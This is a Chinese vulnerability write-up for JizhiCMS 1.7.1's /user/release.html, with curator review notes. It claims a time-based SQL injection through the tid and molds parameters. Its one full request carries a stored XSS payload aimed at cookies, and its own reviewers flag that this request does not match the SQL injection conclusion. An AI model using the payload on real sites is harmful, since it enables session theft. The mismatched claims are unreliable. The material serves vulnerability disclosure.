---
source: "hatch 补库批 20260928"
product: "JizhiCMS1.7.1 user/release"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Jizhicms 1.7.1 ._user_release.html sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：会员发表文章权限，tid/molds未过滤进入SQL；DB时间函数"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-a111351915d2a321f4f26622"
entity_id: "ve-a111351915d2a321f4f26622"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：会员发表文章权限，tid/molds未过滤进入SQL；DB时间函数

- **事实待核（1）**：唯一完整请求是title存储XSS载荷，tid2/moldsarticle无延时SQL，却紧接称明显时间延迟，请求与结论错配。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：关键注入载荷/源码只图片，多个图复用另一SQL链资源须核对。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：与220共享发布接口但SQLi与存储XSS不能混并。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Jizhicms 1.7.1 ./user/release.html sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Jizhicms 1.7.1

三、复现过程
------------

同样还是在发表文章这

    POST /user/release.html HTTP/1.1
    Host: www.0-sec.org:8091
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 153
    Origin: http://www.0-sec.org:8091
    Connection: close
    Referer: http://www.0-sec.org:8091/user/release/molds/article.html
    Cookie: PHPSESSID=84m********************2eo; XDEBUG_SESSION=PHPSTORM

    ajax=1&isshow=&molds=article&tid=2&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&keywords=123&litpic=&description=123

![1.png](./.resource/Jizhicms1.7.1._user_release.htmlsql注入漏洞/media/rId24.png)![2.png](./.resource/Jizhicms1.7.1._user_release.htmlsql注入漏洞/media/rId25.png)可以看到有明显的时间延迟，存在基于时间的延迟注入为了直观的展示是否进行了拼接sql语句的操作，监控下sql语句的执行，在mysql监控工具中可以看到没有任何过滤就进行了sql语句的拼接，触发了sql注入漏洞![3.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId26.png)定位到漏洞函数release函数，重点关注下sql语句的拼接问题，一共有两处进行了sql的拼接，只要在进行拼接前没有进行过滤就会存在sql注入漏洞![4.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId27.png)其中\$this-\>classtypedata对应的是数据库中的classtype表中的数据![5.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId28.png)然后跟进到get\_fields\_data函数，根据xdebug调试代码的运行情况，发现fields为空，所以会直接返回data,其中并没有进行任何过滤![6.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId29.png)在release函数函数中只是要求\$w\[\'tid\'\]!=0即可，所以我们可以在tid参数和molds参数处构造sql注入语句![7.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId30.png)用slmap跑的结果![8.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId31.png)

参考链接
--------

> https://xz.aliyun.com/t/7861\#toc-2
